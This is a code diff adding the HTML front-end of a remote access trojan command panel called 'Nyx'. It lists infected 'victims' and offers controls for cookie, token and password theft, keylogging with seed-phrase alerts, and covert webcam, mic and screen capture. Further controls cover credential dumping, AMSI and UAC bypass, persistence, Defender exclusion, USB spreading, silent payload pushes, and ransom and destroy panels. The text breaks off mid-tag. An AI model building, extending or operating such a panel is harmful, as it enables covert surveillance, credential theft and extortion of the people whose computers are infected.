@@ -1,0 +1,713 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="crimson">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1"/>
+<title>Nyx</title>
+<link rel="stylesheet" href="/static/style.css"/>
+<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
+</head>
+<body class="panel-app" class="panel-app">
+<div id="toast"></div>
+
+<!-- left rail -->
+<nav class="rail">
+  <div class="rail-logo">NX</div>
+  <button class="rail-btn active" data-page="victims" onclick="showPage('victims')" title="Machines">
+    <svg viewBox="0 0 24 24"><rect x="3" y="4" width="7" height="7" rx="1.5"/><rect x="14" y="4" width="7" height="7" rx="1.5"/><rect x="3" y="13" width="7" height="7" rx="1.5"/><rect x="14" y="13" width="7" height="7" rx="1.5"/></svg>
+    <span class="tip">Machines</span>
+  </button>
+  <button class="rail-btn" data-page="browsers" onclick="showPage('browsers')" title="Browsers">
+    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="10"/><path d="M2 12h20M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1-4-10 15.3 15.3 0 0 1 4-10z"/></svg>
+    <span class="tip">Browsers</span>
+  </button>
+  <button class="rail-btn" data-page="activity" onclick="showPage('activity')" title="Activity">
+    <svg viewBox="0 0 24 24"><path d="M4 6h16M4 12h10M4 18h14"/></svg>
+    <span class="tip">Activity</span>
+  </button>
+  <button class="rail-btn" data-page="admin" id="rail-admin" onclick="showPage('admin')" title="Admin" style="display:none">
+    <svg viewBox="0 0 24 24"><path d="M12 2l3 6h6l-5 4 2 7-6-4-6 4 2-7-5-4h6z"/></svg>
+    <span class="tip">Admin</span>
+  </button>
+  <button class="rail-btn" data-page="settings" onclick="showPage('settings')" title="Settings">
+    <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M12 1v2M12 21v2M4.2 4.2l1.4 1.4M18.4 18.4l1.4 1.4M1 12h2M21 12h2M4.2 19.8l1.4-1.4M18.4 5.6l1.4-1.4"/></svg>
+    <span class="tip">Settings</span>
+  </button>
+  <button class="rail-btn" onclick="openVault()" title="Loot Vault">
+    <svg viewBox="0 0 24 24"><path d="M4 7h16v12a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2V7z"/><path d="M8 7V5a4 4 0 0 1 8 0v2"/><path d="M12 12v3"/></svg>
+    <span class="tip">Loot Vault</span>
+  </button>
+  <div class="rail-spacer"></div>
+  <div class="rail-status" title="panel live"></div>
+</nav>
+
+<div class="shell">
+  <!-- VICTIMS PAGE -->
+  <section class="page active" id="page-victims">
+    <div class="page-head">
+      <div>
+        <h2>Machines</h2>
+        <p class="sub" id="victim-count">waiting for check-ins</p>
+      </div>
+      <div class="top-actions">
+        <div class="search">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
+          <input id="victim-search" placeholder="filter…" oninput="refreshVictims()"/>
+        </div>
+        <button class="cmd sm" onclick="refreshVictims()">Refresh</button>
+        <button class="cmd sm danger" onclick="massCmd()">Mass cmd</button>
+      </div>
+    </div>
+    <div id="bulk-bar" class="bulk-bar hidden">
+      <span id="bulk-count">0 selected</span>
+      <button class="cmd sm" onclick="massSend('screenshot')">Shot all</button>
+      <button class="cmd sm" onclick="massSend('steal')">Steal all</button>
+      <button class="cmd sm" onclick="massSend('lock')">Lock all</button>
+      <button class="cmd sm" onclick="bulkAlias()">Alias selected</button>
+      <button class="cmd sm" onclick="bulkNotes()">Notes selected</button>
+      <button class="cmd sm danger" onclick="massDeleteVictims()">Delete selected</button>
+      <button class="cmd sm" onclick="selected.clear(); refreshVictims()">Clear</button>
+    </div>
+    <div class="victim-grid" id="victim-list"></div>
+  </section>
+
+
+  <!-- BROWSERS PAGE -->
+  <section class="page" id="page-browsers">
+    <div class="page-head">
+      <div>
+        <h2>Browsers</h2>
+        <p class="sub" id="browser-count">0 clients</p>
+      </div>
+      <div class="top-actions">
+        <div class="search">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="M21 21l-4.3-4.3"/></svg>
+          <input id="browser-search" placeholder="filter…" oninput="refreshBrowsers()"/>
+        </div>
+        <button class="cmd sm" type="button" onclick="refreshBrowsers()">Refresh</button>
+      </div>
+    </div>
+
+    <div class="victim-grid" id="browser-list"></div>
+
+    <!-- single-client detail (like machine control, stays on page) -->
+    <div id="br-detail" class="hidden" style="margin-top:20px;display:none">
+      <div class="control-head" style="margin-bottom:12px">
+        <button class="back-btn" type="button" onclick="closeBrowserDetail()" title="back">
+          <svg viewBox="0 0 24 24" width="18" height="18"><path d="M15 18l-6-6 6-6" fill="none" stroke="currentColor" stroke-width="2"/></svg>
+        </button>
+        <div class="control-title">
+          <h2 id="br-title">browser</h2>
+          <p id="br-subtitle">—</p>
+        </div>
+        <div class="stat-pills" id="br-stats"></div>
+        <button class="cmd sm danger" type="button" id="br-delete-btn">Remove</button>
+      </div>
+
+      <div class="card" style="padding:14px;border:1px solid var(--border);border-radius:12px;margin-bottom:12px">
+        <div style="font-weight:600;margin-bottom:8px">Steal</div>
+        <div style="display:flex;flex-wrap:wrap;gap:8px">
+          <button class="cmd" type="button" id="br-act-cookies">All cookies</button>
+          <button class="cmd" type="button" id="br-act-roblox">Roblox pack</button>
+          <button class="cmd" type="button" id="br-act-discord">Discord token</button>
+          <button class="cmd" type="button" id="br-act-google">Google pack</button>
+          <button class="cmd" type="button" id="br-act-steam">Steam pack</button>
+          <button class="cmd" type="button" id="br-act-forms">Form passwords</button>
+          <button class="cmd" type="button" id="br-act-history">History</button>
+          <button class="cmd" type="button" id="br-act-bookmarks">Bookmarks</button>
+          <button class="cmd" type="button" id="br-act-screenshot">Tab screenshot</button>
+          <button class="cmd primary" type="button" id="br-act-all">Steal all</button>
+          <button class="cmd" type="button" id="br-act-refresh-loot">Refresh loot</button>
+        </div>
+        <div style="margin-top:12px;font-weight:600;margin-bottom:6px">Notes / tags</div>
+        <div style="display:flex;gap:8px;flex-wrap:wrap">
+          <input class="input grow" id="br-notes" placeholder="notes"/>
+          <input class="input" id="br-tags" placeholder="tags, comma,separated" style="min-width:180px"/>
+          <button class="cmd sm" type="button" id="br-save-meta">Save</button>
+          <button class="cmd sm" type="button" id="br-pin">Pin</button>
+        </div>
+        <div id="br-tabs-list" class="muted" style="font-size:12px;margin-top:10px"></div>
+      </div>
+
+
+      <div class="card" style="padding:14px;border:1px solid var(--border);border-radius:12px">
+        <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px">
+          <div style="font-weight:600">Loot</div>
+          <a class="cmd sm" id="br-loot-zip-link" href="#">Download all zip</a>
+        </div>
+        <div id="br-loot-out" class="steal-summary">no loot yet</div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ACTIVITY PAGE -->
+  <section class="page" id="page-activity">
+    <div class="page-head">
+      <div>
+        <h2>Activity</h2>
+        <p class="sub">live feed across all machines</p>
+      </div>
+      <button class="cmd sm" onclick="loadActivity()">Refresh</button>
+    </div>
+    <div id="activity-feed" class="activity-feed"></div>
+  </section>
+
+  <!-- ADMIN PAGE -->
+  <section class="page" id="page-admin">
+    <div class="page-head">
+      <div>
+        <h2>Admin</h2>
+        <p class="sub">create users · non-admin can use panel but not this page</p>
+      </div>
+      <button class="cmd sm" onclick="logout()">Logout</button>
+    </div>
+    <div class="panel active" style="display:block">
+      <div class="panel-title">Create account</div>
+      <div class="row">
+        <input class="input grow" id="new-user" placeholder="username"/>
+        <input class="input grow" id="new-pass" type="password" placeholder="password"/>
+        <select class="input" id="new-role" style="max-width:120px">
+          <option value="user">user</option>
+          <option value="admin">admin</option>
+        </select>
+        <button class="cmd primary" onclick="adminCreateUser()">Create</button>
+      </div>
+      <div class="panel-desc" style="margin-top:16px">Accounts</div>
+      <div id="admin-users"></div>
+    </div>
+  </section>
+
+  <!-- SETTINGS PAGE -->
+  <section class="page" id="page-settings">
+    <div class="page-head">
+      <div>
+        <h2>Settings</h2>
+        <p class="sub">appearance & panel</p>
+      </div>
+    </div>
+    <div class="settings-card">
+      <h3>Theme</h3>
+      <p>saved in this browser</p>
+      <div class="theme-grid" id="theme-grid">
+        <div class="theme-swatch" data-theme="crimson" onclick="setTheme('crimson')"><div class="theme-dot" style="--sw:#e11d48"></div>Crimson</div>
+        <div class="theme-swatch" data-theme="ocean" onclick="setTheme('ocean')"><div class="theme-dot" style="--sw:#38bdf8"></div>Ocean</div>
+        <div class="theme-swatch" data-theme="forest" onclick="setTheme('forest')"><div class="theme-dot" style="--sw:#4ade80"></div>Forest</div>
+        <div class="theme-swatch" data-theme="violet" onclick="setTheme('violet')"><div class="theme-dot" style="--sw:#a78bfa"></div>Violet</div>
+        <div class="theme-swatch" data-theme="amber" onclick="setTheme('amber')"><div class="theme-dot" style="--sw:#fbbf24"></div>Amber</div>
+        <div class="theme-swatch" data-theme="light" onclick="setTheme('light')"><div class="theme-dot" style="--sw:#e11d48"></div>Light</div>
+        <div class="theme-swatch" data-theme="midnight" onclick="setTheme('midnight')"><div class="theme-dot" style="--sw:#818cf8"></div>Midnight</div>
+        <div class="theme-swatch" data-theme="rose" onclick="setTheme('rose')"><div class="theme-dot" style="--sw:#fb7185"></div>Rose</div>
+        <div class="theme-swatch" data-theme="slate" onclick="setTheme('slate')"><div class="theme-dot" style="--sw:#94a3b8"></div>Slate</div>
+        <div class="theme-swatch" data-theme="cyber" onclick="setTheme('cyber')"><div class="theme-dot" style="--sw:#22d3ee"></div>Cyber</div>
+        <div class="theme-swatch" data-theme="ember" onclick="setTheme('ember')"><div class="theme-dot" style="--sw:#f97316"></div>Ember</div>
+        <div class="theme-swatch" data-theme="mono" onclick="setTheme('mono')"><div class="theme-dot" style="--sw:#a3a3a3"></div>Mono</div>
+      </div>
+    </div>
+    <div class="settings-card" style="margin-top:14px">
+      <h3>Panel</h3>
+      <p>Nyx control · Railway deploy</p>
+      <button class="cmd" onclick="openVault()">Open Loot Vault</button>
+    </div>
+  </section>
+
+  <!-- CONTROL PAGE (single victim) -->
+  <section class="page" id="page-control">
+    <div class="control-head">
+      <button class="back-btn" onclick="showPage('victims')" title="back">
+        <svg viewBox="0 0 24 24"><path d="M15 18l-6-6 6-6"/></svg>
+      </button>
+      <div class="control-title">
+        <h2 id="title">machine</h2>
+        <p id="subtitle">—</p>
+      </div>
+      <div class="stat-pills" id="stats"></div>
+      <button class="cmd sm" onclick="clearAllOutputs()" title="clear outputs">Clear out</button>
+      <button class="cmd sm danger" onclick="deleteVictimPermanent()" title="remove from panel forever">Delete victim</button>
+    </div>
+
+    <aside class="side-nav" id="side-nav">
+      <button class="nav-item active" data-panel="overview" onclick="openPanel('overview')"><span class="ni">01</span>Overview</button>
+      <button class="nav-item" data-panel="screen" onclick="openPanel('screen')"><span class="ni">02</span>Screen</button>
+      <button class="nav-item" data-panel="mic" onclick="openPanel('mic')"><span class="ni">M</span>Mic</button>
+      <button class="nav-item" data-panel="webcam" onclick="openPanel('webcam')"><span class="ni">03</span>Webcam</button>
+      <button class="nav-item" data-panel="keylog" onclick="openPanel('keylog')"><span class="ni">04</span>Keylogger</button>
+      <button class="nav-item" data-panel="clip" onclick="openPanel('clip')"><span class="ni">05</span>Clipboard</button>
+      <button class="nav-item" data-panel="stealer" onclick="openPanel('stealer')"><span class="ni">06</span>Stealer</button>
+      <button class="nav-item" data-panel="hunt" onclick="openPanel('hunt')"><span class="ni">08b</span>Hunt <span class="tag mild">mild</span></button>
+      <button class="nav-item" data-panel="files" onclick="openPanel('files')"><span class="ni">07</span>Files</button>
+      <button class="nav-item" data-panel="shell" onclick="openPanel('shell')"><span class="ni">08</span>Shell</button>
+      <button class="nav-item" data-panel="process" onclick="openPanel('process')"><span class="ni">09</span>Processes</button>
+      <button class="nav-item" data-panel="wifi" onclick="openPanel('wifi')"><span class="ni">10</span>Wi‑Fi</button>
+      <button class="nav-item" data-panel="jobs" onclick="openPanel('jobs');loadJobs()"><span class="ni">J</span>Jobs</button>
+      <button class="nav-item" data-panel="power" onclick="openPanel('power')"><span class="ni">P</span>Power</button>
+      <button class="nav-item" data-panel="system" onclick="openPanel('system')"><span class="ni">11</span>System</button>
+      <button class="nav-item" data-panel="machine" onclick="openPanel('machine')"><span class="ni">MP</span>Machine</button>
+      <button class="nav-item" data-panel="rats" onclick="openPanel('rats')"><span class="ni">R</span>Rats</button>
+      <button class="nav-item" data-panel="persist" onclick="openPanel('persist')"><span class="ni">12</span>Stay Alive</button>
+      <button class="nav-item" data-panel="payload" onclick="openPanel('payload')"><span class="ni">13</span>Payload</button>
+      <button class="nav-item" data-panel="chaos" onclick="openPanel('chaos')"><span class="ni">14</span>Chaos</button>
+      <button class="nav-item" data-panel="ransom" onclick="openPanel('ransom')"><span class="ni">15</span>Ransom</button>
+      <button class="nav-item" data-panel="clean" onclick="openPanel('clean')"><span class="ni">16</span>Clean Up</button>
+      <button class="nav-item" data-panel="destroy" onclick="openPanel('destroy')"><span class="ni">17</span>Destroy</button>
+    </aside>
+
+    <div class="work">
+      <!-- OVERVIEW -->
+      <div class="panel active" id="panel-overview">
+        <div class="panel-title">Overview</div>
+        <div class="panel-desc">machine snapshot & quick actions</div>
+        <div class="row">
+          <button class="cmd primary" onclick="send('sysinfo')">Refresh info</button>
+          <button class="cmd" onclick="send('screenshot')">Quick shot</button>
+          <button class="cmd" onclick="send('steal')">Quick steal</button>
+          <button class="cmd" onclick="send('active_window')">Active window</button>
+        </div>
+        <label class="panel-desc" style="display:block;margin-top:12px">Display name</label>
+        <div class="row">
+          <input class="input grow" id="victim-alias" placeholder="custom name for this machine"/>
+          <button class="cmd sm" onclick="renameVictim()">Rename</button>
+        </div>
+        <label class="panel-desc" style="display:block;margin-top:12px">Notes</label>
+        <textarea class="input" id="victim-notes" rows="2" placeholder="tags, reminders…"></textarea>
+        <div class="row">
+          <button class="cmd sm" onclick="saveNotes()">Save notes</button>
+        </div>
+        <div class="row" style="margin-top:8px">
+          <input class="input grow" id="victim-tags" placeholder="tags: work, high, opera"/>
+          <button class="cmd sm" onclick="saveTags()">Save tags</button>
+          <button class="cmd sm" onclick="exportVictim()">Export profile</button>
+        </div>
+        <div id="steal-progress" class="steal-progress hidden"><div class="steal-bar" id="steal-bar"></div><span id="steal-prog-text">stealer</span></div>
+        <pre class="out-box" id="out-overview"></pre>
+      </div>
+
+      <!-- SCREEN -->
+      <div class="panel" id="panel-screen">
+        <div class="panel-title">Screen</div>
+        <div class="panel-desc">capture & silent stream</div>
+        <div class="row">
+          <button class="cmd primary" onclick="send('screenshot',{target:screenTarget()})">Screenshot</button>
+          <button class="cmd" onclick="send('screen_start',{target:screenTarget()})">Live stream</button>
+          <button class="cmd" onclick="send('screen_start',{target:screenTarget(),idle_only:true})">Idle-only</button>
+          <button class="cmd" onclick="send('screen_stop')">Stop stream</button>
+        </div>
+        <div class="row" style="margin-top:6px">
+          <button class="cmd sm" onclick="setScreenTarget('active')">Active window</button>
+          <button class="cmd sm" onclick="setScreenTarget('monitor:0')">Screen 1</button>
+          <button class="cmd sm" onclick="setScreenTarget('monitor:1')">Screen 2</button>
+          <button class="cmd sm" onclick="setScreenTarget('primary')">Primary</button>
+          <button class="cmd sm" onclick="send('monitors')">List monitors</button>
+          <span class="pill" id="screen-target-label">target: active</span>
+          <button class="cmd" onclick="send('auto_ss_start',{interval:300})">Auto 5m</button>
+          <button class="cmd" onclick="send('auto_ss_stop')">Stop auto</button>
+        </div>
+        <div class="img-stage" id="screen-stage"></div>
+        <pre class="out-box" id="out-screen"></pre>
+      </div>
+
+      <!-- WEBCAM -->
+      <div class="panel" id="panel-webcam">
+        <div class="panel-title">Webcam</div>
+        <div class="panel-desc">list · snap · stream</div>
+        <div class="row">
+          <button class="cmd" onclick="send('webcam_list')">List cams</button>
+          <select class="input" id="cam-sel"></select>
+          <button class="cmd primary" onclick="snapCam()">Snap</button>
+          <button class="cmd" onclick="startCam()">Stream</button>
+          <button class="cmd" onclick="send('webcam_stop')">Stop</button>
+        </div>
+        <div class="img-stage" id="webcam-stage"></div>
+        <pre class="out-box" id="out-webcam"></pre>
+      </div>
+
+      <!-- KEYLOG -->
+      <div class="panel" id="panel-keylog">
+        <div class="panel-title">Keylogger</div>
+        <div class="panel-desc">live stream · alerts on seed / password patterns · flush clears log · stop kills listener</div>
+        <div class="row">
+          <button class="cmd primary" onclick="send('keylog_start')">Start</button>
+          <button class="cmd" onclick="send('keylog_stop'); clearKeylogUI()">Stop</button>
+          <button class="cmd" onclick="send('keylog_flush'); clearKeylogUI()">Flush</button>
+          <button class="cmd" onclick="downloadKeylog()">Download</button>
+        </div>
+        <pre class="out-box tall" id="out-keylog"></pre>
+      </div>
+
+      <!-- CLIPBOARD -->
+      <div class="panel" id="panel-clip">
+        <div class="panel-title">Clipboard</div>
+        <div class="panel-desc">live copy-watch & window title</div>
+        <div class="row">
+          <button class="cmd primary" onclick="send('clipboard_start')">Live watch</button>
+          <button class="cmd" onclick="send('clipboard_stop')">Stop</button>
+          <button class="cmd" onclick="send('clipboard_get')">Grab now</button>
+          <button class="cmd" onclick="send('active_window')">Window title</button>
+          <button class="cmd" onclick="send('clip_history')">Clip history</button>
+          <button class="cmd sm" onclick="setOut('clip','')">Clear log</button>
+        </div>
+        <pre class="out-box tall" id="out-clip"></pre>
+      </div>
+
+      
+      <div class="panel" id="panel-mic">
+        <div class="panel-title">Microphone</div>
+        <div class="panel-desc">list devices · record short clip (wav)</div>
+        <div class="row">
+          <button class="cmd" onclick="send('mic_list')">List mics</button>
+          <button class="cmd primary" onclick="send('mic_start',{})">Live mic</button>
+          <button class="cmd" onclick="send('mic_stop')">Stop live</button>
+          <input class="input" id="mic-sec" style="width:70px" value="8" title="seconds"/>
+          <button class="cmd" onclick="send('mic_record',{seconds:parseInt(document.getElementById('mic-sec').value)||8})">Record clip</button>
+        </div>
+        <pre class="out-box" id="out-mic"></pre>
+        <div id="mic-audio"></div>
+      </div>
+
+      
+      <div class="panel" id="panel-power">
+        <div class="panel-title">Power</div>
+        <div class="panel-desc">shutdown · restart · logoff · abort</div>
+        <div class="row">
+          <button class="cmd danger" onclick="if(confirm('Shutdown this machine?')) send('shutdown')">Shutdown</button>
+          <button class="cmd danger" onclick="if(confirm('Restart this machine?')) send('restart')">Restart</button>
+          <button class="cmd" onclick="if(confirm('Log off user?')) send('logoff')">Log off</button>
+          <button class="cmd" onclick="send('abort_shutdown')">Abort shutdown</button>
+        </div>
+        <pre class="out-box" id="out-power"></pre>
+      </div>
+
+      
+      <div class="panel" id="panel-jobs">
+        <div class="panel-title">Scheduled jobs</div>
+        <div class="panel-desc">repeat a command on this machine</div>
+        <div class="row">
+          <select class="input" id="job-cmd">
+            <option value="steal">Full stealer</option>
+            <option value="steal_browsers">Browsers</option>
+            <option value="screenshot">Screenshot</option>
+            <option value="steal_discord">Discord</option>
+            <option value="steal_launchers">Launchers</option>
+            <option value="sysinfo">Sysinfo</option>
+          </select>
+          <input class="input" id="job-every" placeholder="every sec" value="3600" style="width:100px"/>
+          <button class="cmd primary" onclick="addJob()">Add job</button>
+          <button class="cmd sm" onclick="loadJobs()">Refresh</button>
+        </div>
+        <pre class="out-box" id="out-jobs"></pre>
+      </div>
+
+      
+      <div class="panel" id="panel-machine">
+        <div class="panel-title">Machine persist</div>
+        <div class="panel-desc">all-users logon (needs admin on victim) · survives new Windows users</div>
+        <div class="row">
+          <button class="cmd primary" onclick="send('machine_persist')">Install all-users</button>
+          <button class="cmd danger" onclick="send('machine_persist_off')">Remove all-users</button>
+        </div>
+        <pre class="out-box" id="out-machine"></pre>
+      </div>
+      <div class="panel" id="panel-rats">
+        <div class="panel-title">Rats on PC</div>
+        <div class="panel-desc">processes · drop paths · Run keys · kill by pid/path</div>
+        <div class="row">
+          <button class="cmd primary" onclick="send('rat_list')">Scan</button>
+          <input class="input" id="rat-pid" placeholder="pid" style="width:90px"/>
+          <button class="cmd danger" onclick="send('rat_kill',{pid:document.getElementById('rat-pid').value})">Kill PID</button>
+          <input class="input grow" id="rat-path" placeholder="full path to exe"/>
+          <button class="cmd danger" onclick="send('rat_kill',{path:document.getElementById('rat-path').value})">Delete file</button>
+        </div>
+        <pre class="out-box tall" id="out-rats"></pre>
+      </div>
+
+      <!-- STEALER -->
+      <div class="panel" id="panel-stealer">
+        <div class="panel-title">Stealer</div>
+        <div class="panel-desc">full · per-browser · zip includes cqm_cookies.json for Firefox Nightly / Cookie Quick Manager</div>
+        <div class="row">
+          <button class="cmd primary" id="btn-steal" onclick="runSteal()">Full stealer</button>
+          <button class="cmd" onclick="send('steal_discord')">Discord</button>
+          <button class="cmd" onclick="send('steal_roblox')">Roblox</button>
+          <button class="cmd" onclick="send('steal_email')">Email</button>
+          <button class="cmd" onclick="send('steal_launchers')">Steam/Epic/Riot</button>
+        </div>
+        <div class="panel-desc" style="margin-top:8px">profile pack (DB files for offline decrypt)</div>
+        <div class="row">
+          <button class="cmd sm" onclick="send('pack_profile',{browser:'chrome'})">Pack Chrome</button>
+          <button class="cmd sm" onclick="send('pack_profile',{browser:'edge'})">Pack Edge</button>
+          <button class="cmd sm" onclick="send('pack_profile',{browser:'opera'})">Pack Opera</button>
+          <button class="cmd sm" onclick="send('pack_profile',{browser:'operagx'})">Pack OperaGX</button>
+          <button class="cmd sm" onclick="send('pack_profile',{browser:'firefox'})">Pack Firefox</button>
+        </div>
+        <div class="row" style="margin-top:8px">
+          <button class="cmd" onclick="send('kill_browsers',{})">Close all browsers</button>
+          <button class="cmd sm" onclick="send('kill_browsers',{browser:'chrome'})">Kill Chrome</button>
+          <button class="cmd sm" onclick="send('kill_browsers',{browser:'edge'})">Kill Edge</button>
+          <button class="cmd sm" onclick="send('kill_browsers',{browser:'opera'})">Kill Opera</button>
+          <button class="cmd sm" onclick="send('kill_browsers',{browser:'firefox'})">Kill Firefox</button>
+          <button class="cmd sm" onclick="send('kill_browsers',{browser:'discord'})">Kill Discord</button>
+        </div>
+        <div class="panel-desc" style="margin-top:8px">browsers — pick one or all</div>
+        <div class="row">
+          <button class="cmd" onclick="send('steal_browsers',{})">All browsers</button>
+          <button class="cmd" onclick="send('steal_browser',{browser:'chrome'})">Chrome</button>
+          <button class="cmd" onclick="send('steal_browser',{browser:'edge'})">Edge</button>
+          <button class="cmd" onclick="send('steal_browser',{browser:'opera'})">Opera</button>
+          <button class="cmd" onclick="send('steal_browser',{browser:'brave'})">Brave</button>
+          <button class="cmd" onclick="send('steal_browser',{browser:'firefox'})">Firefox</button>
+        </div>
+        <div class="row">
+          <button class="cmd sm" onclick="send('steal_browser',{browser:'vivaldi'})">Vivaldi</button>
+          <button class="cmd sm" onclick="send('steal_browser',{browser:'yandex'})">Yandex</button>
+          <button class="cmd sm" onclick="send('steal_browser',{browser:'chromium'})">Chromium</button>
+        </div>
+        <div id="steal-links" class="row"></div>
+        <div id="steal-summary" class="steal-summary"></div>
+        <pre class="out-box" id="out-stealer"></pre>
+      </div>
+
+      <!-- HUNT -->
+      <div class="panel" id="panel-hunt">
+        <div class="panel-title">Hunt</div>
+        <div class="panel-desc">credentials · file search · focus screenshots</div>
+        <div class="row">
+          <button class="cmd primary" onclick="send('cred_dump')">Credential Manager</button>
+          <button class="cmd" onclick="send('focus_ss_start')">Focus SS on</button>
+          <button class="cmd" onclick="send('focus_ss_stop')">Focus SS off</button>
+        </div>
+        <div class="row">
+          <input class="input grow" id="hunt-patterns" placeholder="patterns: *seed*,*.kdbx,*wallet*"/>
+          <button class="cmd primary" onclick="runFileSearch()">Search files</button>
+        </div>
+        <pre class="out-box tall" id="out-hunt"></pre>
+      </div>
+
+      <!-- FILES -->
+      <div class="panel" id="panel-files">
+        <div class="panel-title">Files</div>
+        <div class="panel-desc">browse · download · upload</div>
+        <div class="row">
+          <button class="cmd sm" onclick="listDir('')">Home</button>
+          <button class="cmd sm" onclick="listDir('Desktop')">Desktop</button>
+          <button class="cmd sm" onclick="listDir('Documents')">Documents</button>
+          <button class="cmd sm" onclick="listDir('Downloads')">Downloads</button>
+          <input class="input grow" id="file-path" placeholder="C:\path\to\dir"/>
+          <button class="cmd primary" onclick="listDir(document.getElementById('file-path').value)">List</button>
+        </div>
+        <div id="file-table" class="table-wrap"></div>
+        <div class="row" style="margin-top:12px">
+          <input type="file" id="upload-input" class="input"/>
+          <input class="input grow" id="upload-dest" placeholder="dest folder (optional)"/>
+          <button class="cmd" onclick="uploadToVictim()">Upload</button>
+        </div>
+        <pre class="out-box" id="out-files"></pre>
+      </div>
+
+      <!-- SHELL -->
+      <div class="panel" id="panel-shell">
+        <div class="panel-title">Shell</div>
+        <div class="panel-desc">CMD · PowerShell · AMSI bypass</div>
+        <div class="row">
+          <input class="input grow" id="shell-cmd" placeholder="command"/>
+          <button class="cmd primary" onclick="runShell(false)">CMD</button>
+          <button class="cmd" onclick="runShell(true)">PowerShell</button>
+          <label class="chk"><input type="checkbox" id="amsi-bypass"/> AMSI bypass</label>
+        </div>
+        <div class="presets">
+          <button class="cmd sm" onclick="preset('whoami /all')">whoami</button>
+          <button class="cmd sm" onclick="preset('ipconfig /all')">ipconfig</button>
+          <button class="cmd sm" onclick="preset('netstat -ano')">netstat</button>
+          <button class="cmd sm" onclick="preset('Get-Process | Sort CPU -Desc | Select -First 15')">top CPU</button>
+          <button class="cmd sm" onclick="preset('netsh wlan show profiles')">wifi profiles</button>
+          <button class="cmd sm" onclick="preset('Get-LocalUser')">users</button>
+          <button class="cmd sm" onclick="preset('Get-Service | ? Status -eq Running')">services</button>
+          <button class="cmd sm" onclick="preset('Get-Clipboard')">clipboard</button>
+          <button class="cmd sm" onclick="preset('Get-MpComputerStatus | Select AMServiceEnabled,AntispywareEnabled,RealTimeProtectionEnabled')">defender</button>
+          <button class="cmd sm" onclick="preset('Get-ScheduledTask | Select TaskName,State | ft -AutoSize')">tasks</button>
+          <button class="cmd sm" onclick="preset('Get-NetFirewallProfile | Select Name,Enabled')">firewall</button>
+          <button class="cmd sm" onclick="preset('Get-PSDrive')">drives</button>
+          <button class="cmd sm" onclick="preset('dir $env:USERPROFILE\\Desktop')">desktop</button>
+        </div>
+        <pre class="out-box tall" id="out-shell"></pre>
+      </div>
+
+      <!-- PROCESSES -->
+      <div class="panel" id="panel-process">
+        <!-- freeze controls injected -->
+        <div class="panel-title">Processes</div>
+        <div class="row">
+          <input class="input" id="proc-pid" placeholder="pid" style="width:100px"/>
+          <button class="cmd" onclick="send('proc_freeze',{pid:document.getElementById('proc-pid').value})">Freeze</button>
+          <button class="cmd" onclick="send('proc_thaw',{pid:document.getElementById('proc-pid').value})">Thaw</button>
+        </div>
+        <div class="panel-desc">live list · search · kill</div>
+        <div class="row">
+          <button class="cmd primary" onclick="send('processes')">Refresh</button>
+          <input class="input grow" id="proc-search" placeholder="filter name or pid…" oninput="filterProcs()"/>
+        </div>
+        <div id="proc-table" class="table-wrap"></div>
+        <pre class="out-box" id="out-process"></pre>
+      </div>
+
+      <!-- WIFI -->
+      <div class="panel" id="panel-wifi">
+        <div class="panel-title">Wi‑Fi</div>
+        <div class="panel-desc">saved profiles + cleartext keys</div>
+        <button class="cmd primary" onclick="send('wifi')">Dump passwords</button>
+        <pre class="out-box tall" id="out-wifi"></pre>
+      </div>
+
+      <!-- SYSTEM -->
+      <div class="panel" id="panel-system">
+        <div class="panel-title">System</div>
+        <div class="panel-desc">locks · policy toggles · UAC</div>
+        <div class="grid2">
+          <button class="cmd" onclick="send('taskmgr_off')">TaskMgr off</button>
+          <button class="cmd" onclick="send('taskmgr_on')">TaskMgr on</button>
+          <button class="cmd" onclick="send('cmd_off')">CMD off</button>
+          <button class="cmd" onclick="send('cmd_on')">CMD on</button>
+          <button class="cmd" onclick="send('regedit_off')">Regedit off</button>
+          <button class="cmd" onclick="send('regedit_on')">Regedit on</button>
+          <button class="cmd" onclick="send('uac_bypass')">UAC bypass</button>
+          <button class="cmd" onclick="send('lock')">Lock screen</button>
+        </div>
+        <div class="row">
+          <input class="input grow" id="msg-text" placeholder="message"/>
+          <input class="input" id="msg-title" placeholder="title" value="Windows"/>
+          <button class="cmd" onclick="send('notify',{text:document.getElementById('msg-text').value,title:document.getElementById('msg-title').value,kind:'info'})">Popup</button>
+        </div>
+        <pre class="out-box" id="out-system"></pre>
+      </div>
+
+      <!-- STAY ALIVE -->
+      <div class="panel" id="panel-persist">
+        <div class="panel-title">Stay Alive</div>
+        <div class="panel-desc">persistence · watchdog · USB · defender</div>
+        <div class="grid2">
+          <button class="cmd primary" onclick="send('persist_task')">Scheduled task</button>
+          <button class="cmd" onclick="send('persist_startup')">Startup folder</button>
+          <button class="cmd" onclick="send('defender_exclude')">Defender exclude</button>
+          <button class="cmd" onclick="send('spread_usb')">Copy to USB</button>
+        </div>
+        <div class="panel-desc" style="margin-top:14px">Watchdog — keeps a hidden PowerShell loop + 5‑min task; restarts EXE if killed</div>
+        <div class="row">
+          <button class="cmd primary" onclick="send('watchdog')">Start watchdog</button>
+          <button class="cmd" onclick="send('watchdog_force')">Restart watchdog</button>
+          <button class="cmd" onclick="send('watchdog_status')">Status</button>
+          <button class="cmd danger" onclick="send('watchdog_stop')">Kill watchdog</button>
+        </div>
+        <pre class="out-box" id="out-persist"></pre>
+      </div>
+
+      <!-- PAYLOAD -->
+      <div class="panel" id="panel-payload">
+        <div class="panel-title">Payload</div>
+        <div class="panel-desc">drag exe from PC → hosted on panel → silent push · no window · choose update or run</div>
+        <div class="drop-zone" id="payload-drop"
+             ondragover="event.preventDefault(); this.classList.add('drag')"
